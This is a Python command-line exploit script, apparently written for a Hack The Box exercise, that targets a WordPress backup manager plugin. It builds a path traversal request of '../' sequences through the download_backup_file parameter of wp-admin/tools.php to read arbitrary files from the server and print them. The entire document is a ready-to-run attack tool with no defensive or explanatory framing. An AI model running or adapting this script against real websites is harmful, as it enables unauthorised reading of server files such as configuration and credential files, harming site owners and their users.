import argparse
import requests
import random
from colorama import Fore, Style, init

def construct_url(ip_address, port, target_uri, filepath, depth):
    """
    Constructs a URL according to the specified parameters including a port number.
    
    Args:
    ip_address (str): The IP address of the server.
    port (int): The port number for the server.
    target_uri (str): The URI part after the IP address.
    filepath (str): The path to the file.
    depth (int): The depth parameter to be converted to '../' sequences.
    
    Returns:
    str: The fully constructed URL.
    """
    # Convert depth to '../' sequences
    depth_path = '../' * depth
    
    # Construct the base URL
    if target_uri:
        if not target_uri.startswith('/'):
            target_uri = '/' + target_uri
        target_uri = target_uri.rstrip('/') + '/'
    else:
        target_uri = '/'
    
    # Remove leading slash from filepath to prevent double slashes
    if filepath.startswith('/'):
        filepath = filepath[1:]
    
    base_url = f"http://{ip_address}:{port}{target_uri}wp-admin/tools.php?page=backup_manager&download_backup_file={depth_path}{filepath}"
    return base_url

def fetch_and_display_file(url):
    """
    Fetches and displays the contents of a file located at the given URL.
    
    Args:
    url (str): The URL from which to fetch the file contents.
    """
    try:
        response = requests.get(url)
        if response.status_code == 200:
            print("[+] Reading file from URL:", url + '\n')
            print(response.text)
        else:
            print(f"Failed to retrieve file. HTTP Status Code: {response.status_code}")
    except requests.exceptions.RequestException as e:
        print("Error while making HTTP request to download the file:", e)

def print_colored_banner():
    colors = [Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN, Fore.WHITE]
    color = random.choice(colors)
    banner = f"""{color}
 __   __  ___    _______        ________  __     ___      ___    _______   ___       _______      ___       _______  __        
|"  |/  \|  "|  |   __ "\\      /"       )|" \\   |"  \\    /"  |  |   __ "\\ |"  |     /"     "|    |"  |     /"     "||" \\       
|'  /    \\:  |  (. |__) :)    (:   \\___/ ||  |   \\   \\  //   |  (. |__) :)||  |    (: ______)    ||  |    (: ______)||  |      
|: /'        |  |:  ____/      \\___  \\   |:  |   /\\  \\/.    |  |:  ____/ |:  |     \\/    |      |:  |     \\/    |  |:  |      
 \\//  /\\'    |  (|  /           __/  \\\\  |.  |  |: \\.        |  (|  /      \\  |___  // ___)_      \\  |___  // ___)  |.  |      
 /   /  \\\\   | /|__/ \\         /" \\   :) /\\  |\\ |.  \\    /:  | /|__/ \\    ( \\_|:  \\(:      "|    ( \\_|:  \\(:  (     /\\  |\\     
|___/    \\___|(_______)       (_______/ (__\\_|_)|___|\\__/|___|(_______)    \\_______)\\_______)     \\_______)\\__/    (__\\_|_)   
{Style.RESET_ALL}
Created By: H088yHaX0R / (HTB - AKA: Marz0) 2024
"""
    print(banner)

def main():
    init(autoreset=True)  # Initialize Colorama to auto-reset styles
    try:
        print_colored_banner()  # Print the banner in random color

        parser = argparse.ArgumentParser(description="Construct and request URL for accessing WordPress backup files.")
        parser.add_argument('-i', '--ip', type=str, required=True, help="The IP address of the server")
        parser.add_argument('-p', '--port', type=int, default=80, help="The port number for the server, default is 80")
        parser.add_argument('-u', '--uri', type=str, default='', help="The target URI path, default is root '/'")
        parser.add_argument('-f', '--filepath', type=str, required=True, help="The file path for the backup file")
        parser.add_argument('-d', '--depth', type=int, required=True, help="The depth parameter, converted to '../' sequences")

        args = parser.parse_args()

        url = construct_url(args.ip, args.port, args.uri, args.filepath, args.depth)
        print("[+] Constructed URL:", url)
        print("[+] Fetching File Now 📂: " + '\n')

        fetch_and_display_file(url)

    except KeyboardInterrupt:
        print("\nInterrupted by user, exiting...")
        exit(1)

if __name__ == "__main__":
    main()
